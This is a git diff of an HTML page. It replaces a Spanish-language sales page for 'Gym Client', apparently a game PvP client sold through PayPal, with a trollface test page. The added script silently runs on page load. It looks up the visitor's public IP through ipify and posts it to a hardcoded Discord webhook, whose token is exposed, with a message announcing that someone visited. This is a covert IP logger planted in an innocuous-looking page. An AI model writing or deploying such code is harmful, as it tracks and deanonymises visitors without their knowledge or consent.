@@ -3,59 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gym Client</title>
-    <link rel="stylesheet" href="style.css">
+    <title>ASDForum</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Gym Client</h1>
-        <p class="price-tag">$15.00 USD</p>
-        <p>Gym Client, uno de los mejores clientes para pvp y utilidades en el mercado, compralo a tan solo 15 dólares.</p>
-        <img class="product-image" src="https://cdn.discordapp.com/attachments/1332177402478071950/1333625876809515031/image.png?ex=67999362&is=679841e2&hm=2c020446b06c5808d4362d6b27635eaf68c740c583fa9b66fc184ae5ed2d9aec&" alt="Gym Client" loading="lazy">
-        <h2>Características:</h2>
-        <ul class="features-list">
-            <li>Combat</li>
-            <li>Player</li>
-            <li>Render</li>
-            <li>Movement</li>
-            <li>Misc</li>
-        </ul>
+    <h1>pruebav1 githubpage</h1>
 
-        <button id="checkout-button" class="buy-button">
-            Comprar Ahora
-        </button>
-    </div>
-
-    <div class="developers">
-        <h2>Developers</h2>
-        <div class="developer-list">
-            <div class="developer">
-                <p class="developer-name">PachecoZzZz</p>
-                <img src="https://cdn.discordapp.com/attachments/1332177402478071950/1333672053680635995/badfula.png?ex=6799be64&is=67986ce4&hm=057f138a306586584de0a49418d69085e162615227a366525dd56992319e1048&" alt="PachecoZzZz">
-            </div>
-            <div class="developer">
-                <p class="developer-name">c1q_</p>
-                <img src="https://cdn.discordapp.com/attachments/1332177402478071950/1333671948219318355/c1q.png?ex=6799be4a&is=67986cca&hm=20aa39927d70fe776f64e3b622fa6ab67c9849c74a553497650b5de1b65a5545&" alt="c1q_">
-            </div>
-            <div class="developer">
-                <p class="developer-name">AfricanWalmart</p>
-                <img src="https://cdn.discordapp.com/attachments/1332177402478071950/1333671947757813801/descarga_1.png?ex=6799be4a&is=67986cca&hm=7e7238f537ad0b120e5444fcbeac8c2aa2b93113cdf7f548e065cc4192209c68&" alt="AfricanWalmart">
-            </div>
-        </div>
-    </div>
+  
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface" style="width: 300px; height: auto;">
 
     <script>
-        // Enlace de PayPal (lo puedes modificar si es necesario)
-        const paypalLink = 'https://www.paypal.com/paypalme/Pachz22?country.x=AR&locale.x=es_XC';
 
-        // Obtenemos el botón de compra
-        const checkoutButton = document.getElementById('checkout-button');
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
 
-        // Añadimos el evento para redirigir a PayPal al hacer click
-        checkoutButton.addEventListener('click', function () {
-            // Redirigimos al usuario al enlace de PayPal
-            window.location.href = paypalLink;
-        });
+                const userIP = data.ip;
+                console.log("La IP pública es: ", userIP);
+
+                const discordWebhookURL = 'https://discord.com/api/webhooks/1348742741399703552/DlwWcZfNX9bbgi2vH2MskQI4vjXIa7vZXFYLQlj8q8h1TXNLSgPnpp2TNCsHAy46xHgh';
+
+                const payload = {
+                    content: `¡Alguien visitó tu página! La IP es: ${userIP}`
+                };
+
+                fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("IP enviada correctamente a Discord.");
+                    } else {
+                        console.error("Hubo un error al enviar la IP.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar la IP a Discord: ", error);
+                });
+            })
+            .catch(error => {
+                console.error("Error al obtener la IP pública: ", error);
+            });
     </script>
 </body>
 </html>
